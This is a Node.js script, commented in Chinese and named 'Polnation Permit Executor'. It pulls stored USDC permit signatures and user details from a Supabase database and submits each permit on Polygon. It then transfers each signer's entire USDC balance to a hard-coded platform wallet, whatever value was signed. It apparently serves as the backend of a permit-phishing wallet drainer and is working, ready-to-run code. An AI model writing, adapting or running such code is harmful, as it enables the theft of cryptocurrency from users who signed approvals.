/**
 * Polnation Permit Executor
 * 
 * 功能：
 * 1. 从 Supabase 读取 pending 状态的签名
 * 2. 执行 permit() 授权
 * 3. 执行 transferFrom() 转移 USDC
 * 4. 更新签名状态
 * 
 * 使用方法：
 * npm start          - 执行所有 pending 签名
 * npm run check      - 只检查，不执行
 */

require('dotenv').config()
const { createClient } = require('@supabase/supabase-js')
const { 
  createWalletClient, 
  createPublicClient, 
  http, 
  parseAbi,
  formatUnits 
} = require('viem')
const { polygon } = require('viem/chains')
const { privateKeyToAccount } = require('viem/accounts')

// ========================================
// 配置
// ========================================

const CONFIG = {
  // Supabase
  supabaseUrl: process.env.SUPABASE_URL,
  supabaseKey: process.env.SUPABASE_SERVICE_KEY,
  
  // 钱包
  privateKey: process.env.PRIVATE_KEY,
  
  // RPC
  rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
  
  // 模式
  mode: process.env.MODE || 'dry-run',
  
  // USDC 合约地址 (Polygon)
  usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
  
  // 平台钱包地址
  platformWallet: '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63',
}

// USDC ABI
const USDC_ABI = parseAbi([
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
])

// ========================================
// 初始化
// ========================================

function validateConfig() {
  const required = ['supabaseUrl', 'supabaseKey', 'privateKey']
  const missing = required.filter(key => !CONFIG[key])
  
  if (missing.length > 0) {
    console.error('❌ 缺少必要的环境变量:', missing.join(', '))
    console.error('请检查 .env 文件')
    process.exit(1)
  }
}

function createClients() {
  // Supabase 客户端
  const supabase = createClient(CONFIG.supabaseUrl, CONFIG.supabaseKey)
  
  // 钱包账户
  const account = privateKeyToAccount(CONFIG.privateKey)
  
  // Public 客户端 (读取)
  const publicClient = createPublicClient({
    chain: polygon,
    transport: http(CONFIG.rpcUrl),
  })
  
  // Wallet 客户端 (写入)
  const walletClient = createWalletClient({
    account,
    chain: polygon,
    transport: http(CONFIG.rpcUrl),
  })
  
  return { supabase, account, publicClient, walletClient }
}

// ========================================
// 核心功能
// ========================================

/**
 * 获取待处理的签名
 */
async function getPendingSignatures(supabase) {
  const { data, error } = await supabase
    .from('permit_signatures')
    .select('*, profiles(username, email)')
    .eq('status', 'pending')
    .order('created_at', { ascending: true })
  
  if (error) {
    console.error('❌ 获取签名失败:', error.message)
    return []
  }
  
  return data || []
}

/**
 * 检查签名是否有效
 */
async function validateSignature(publicClient, sig) {
  // 检查 deadline
  const now = Math.floor(Date.now() / 1000)
  if (sig.deadline < now) {
    return { valid: false, reason: '签名已过期' }
  }
  
  // 检查 nonce
  const currentNonce = await publicClient.readContract({
    address: CONFIG.usdcAddress,
    abi: USDC_ABI,
    functionName: 'nonces',
    args: [sig.owner_address],
  })
  
  if (BigInt(sig.nonce) !== currentNonce) {
    return { valid: false, reason: `Nonce 不匹配 (签名: ${sig.nonce}, 当前: ${currentNonce})` }
  }
  
  // 检查用户余额
  const balance = await publicClient.readContract({
    address: CONFIG.usdcAddress,
    abi: USDC_ABI,
    functionName: 'balanceOf',
    args: [sig.owner_address],
  })
  
  if (balance === 0n) {
    return { valid: false, reason: '用户 USDC 余额为 0' }
  }
  
  return { valid: true, balance }
}

/**
 * 执行单个签名
 */
async function executeSignature(clients, sig) {
  const { publicClient, walletClient, supabase, account } = clients
  
  console.log('\n' + '='.repeat(50))
  console.log(`📝 处理签名: ${sig.id}`)
  console.log(`   用户: ${sig.profiles?.username || sig.profiles?.email || 'Unknown'}`)
  console.log(`   钱包: ${sig.owner_address}`)
  
  // 1. 验证签名
  const validation = await validateSignature(publicClient, sig)
  if (!validation.valid) {
    console.log(`   ❌ 签名无效: ${validation.reason}`)
    
    // 更新状态为 expired
    await supabase
      .from('permit_signatures')
      .update({ status: 'expired' })
      .eq('id', sig.id)
    
    return { success: false, reason: validation.reason }
  }
  
  const balanceFormatted = formatUnits(validation.balance, 6)
  console.log(`   💰 用户余额: $${balanceFormatted} USDC`)
  
  // Dry-run 模式
  if (CONFIG.mode === 'dry-run') {
    console.log(`   🔍 [Dry-Run] 签名有效，跳过执行`)
    return { success: true, dryRun: true }
  }
  
  try {
    // 2. 执行 permit
    console.log(`   ⏳ 执行 permit...`)
    const permitHash = await walletClient.writeContract({
      address: CONFIG.usdcAddress,
      abi: USDC_ABI,
      functionName: 'permit',
      args: [
        sig.owner_address,
        sig.spender_address,
        BigInt(sig.value),
        BigInt(sig.deadline),
        sig.v,
        sig.r,
        sig.s,
      ],
    })
    console.log(`   ✅ Permit TX: ${permitHash}`)
    
    // 等待确认
    await publicClient.waitForTransactionReceipt({ hash: permitHash })
    
    // 3. 执行 transferFrom
    console.log(`   ⏳ 执行 transferFrom...`)
    const transferHash = await walletClient.writeContract({
      address: CONFIG.usdcAddress,
      abi: USDC_ABI,
      functionName: 'transferFrom',
      args: [
        sig.owner_address,
        CONFIG.platformWallet,
        validation.balance, // 转移全部余额
      ],
    })
    console.log(`   ✅ Transfer TX: ${transferHash}`)
    
    // 等待确认
    await publicClient.waitForTransactionReceipt({ hash: transferHash })
    
    // 4. 更新状态
    await supabase
      .from('permit_signatures')
      .update({
        status: 'used',
        used_at: new Date().toISOString(),
        used_tx_hash: transferHash,
      })
      .eq('id', sig.id)
    
    console.log(`   🎉 成功转移 $${balanceFormatted} USDC`)
    
    return { 
      success: true, 
      amount: balanceFormatted,
      txHash: transferHash 
    }
    
  } catch (error) {
    console.log(`   ❌ 执行失败: ${error.message}`)
    return { success: false, reason: error.message }
  }
}

// ========================================
// 主程序
// ========================================

async function main() {
  console.log('╔════════════════════════════════════════════════╗')
  console.log('║       Polnation Permit Executor v1.0           ║')
  console.log('╚════════════════════════════════════════════════╝')
  console.log('')
  
  // 检查命令行参数
  if (process.argv.includes('--check-only')) {
    CONFIG.mode = 'dry-run'
  }
  
  // 验证配置
  validateConfig()
  
  // 初始化客户端
  const clients = createClients()
  
  console.log(`🔧 模式: ${CONFIG.mode === 'dry-run' ? '检查模式 (不执行)' : '执行模式'}`)
  console.log(`🔗 RPC: ${CONFIG.rpcUrl}`)
  console.log(`👛 执行钱包: ${clients.account.address}`)
  console.log(`🎯 接收钱包: ${CONFIG.platformWallet}`)
  
  // 获取待处理签名
  console.log('\n📋 获取待处理签名...')
  const signatures = await getPendingSignatures(clients.supabase)
  
  if (signatures.length === 0) {
    console.log('✅ 没有待处理的签名')
    return
  }
  
  console.log(`📝 找到 ${signatures.length} 个待处理签名`)
  
  // 统计
  const stats = {
    total: signatures.length,
    success: 0,
    failed: 0,
    skipped: 0,
    totalAmount: 0,
  }
  
  // 处理每个签名
  for (const sig of signatures) {
    const result = await executeSignature(clients, sig)
    
    if (result.success) {
      if (result.dryRun) {
        stats.skipped++
      } else {
        stats.success++
        stats.totalAmount += parseFloat(result.amount)
      }
    } else {
      stats.failed++
    }
  }
  
  // 输出统计
  console.log('\n' + '='.repeat(50))
  console.log('📊 执行统计:')
  console.log(`   总数: ${stats.total}`)
  console.log(`   成功: ${stats.success}`)
  console.log(`   失败: ${stats.failed}`)
  console.log(`   跳过: ${stats.skipped}`)
  if (stats.totalAmount > 0) {
    console.log(`   总转移: $${stats.totalAmount.toFixed(2)} USDC`)
  }
  console.log('')
}

// 运行
main().catch(console.error)
